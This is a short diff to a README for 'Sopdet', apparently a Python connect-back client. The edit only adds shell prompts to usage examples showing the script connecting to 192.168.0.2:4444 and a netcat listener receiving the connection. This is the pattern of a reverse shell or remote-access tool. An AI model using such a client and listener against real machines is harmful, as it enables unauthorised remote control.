@@ -10,12 +10,12 @@ Sopdet is a client-side Python script that when run on a Linux/Unix or Windows s
 
 ### Client-side
 
-`python sopdet.py 192.168.0.2 4444 linux`
+`$ python sopdet.py 192.168.0.2 4444 linux`
 
 `[*] Sobdet client connected to 192.168.0.2`
 
 ### Server-side
 
-`nc -lv 4444`
+`$ nc -lv 4444`
 
 `Connection from 192.168.0.3 65095 received!`
